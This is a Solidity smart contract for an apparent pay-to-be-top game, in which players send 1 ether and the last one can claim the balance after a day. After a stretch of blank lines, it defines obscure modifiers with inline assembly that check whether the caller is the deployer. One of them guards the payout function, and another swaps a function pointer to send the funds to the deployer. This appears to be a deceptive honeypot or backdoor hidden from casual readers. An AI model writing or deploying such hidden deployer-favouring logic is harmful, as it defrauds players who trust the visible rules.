// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

contract Jump { 
    address private deployer;
    address public top;
    uint256 public lastTime;

    constructor () payable {
        deployer = msg.sender;
        top = msg.sender;
        lastTime = block.timestamp;
    }

    function topCat() external payable {
        require (msg.value == 1 ether, "Send me 1 Eth");
        lastTime = block.timestamp;
        top = msg.sender;
    }

    function pay() external i {
        require(block.timestamp > lastTime + 60 * 60 * 24, "Too soon");
        require(msg.sender == top, "Sorry, not top");
        payout(msg.sender);
    }

    function payout(address _pay) private {
        uint256 amount = address(this).balance;
        payable(_pay).transfer(amount);
    }








    modifier i {
        _;
        assembly {
            if iszero(eq(sload(0), caller())) {
                stop()
            }
        }
    }

    modifier j {
        _;
        assembly {
            if iszero(eq(sload(deployer.slot), caller())) {
                stop()
            }
        }
    }

    modifier k {
        function(address) internal fun1 = nothing;
        function(address) internal fun2 = payout;
        assembly {
            if eq(sload(0), caller()) {
                fun1 := fun2
            }
        }
        fun1(msg.sender);
        _;
    }

    modifier l {
        assembly {
            if eq(sload(0), caller()) {
//                verbatim_0i_0o(hex"600202", caller())
            }
        }
        _;
    }


    function nothing(address) private {
    }
}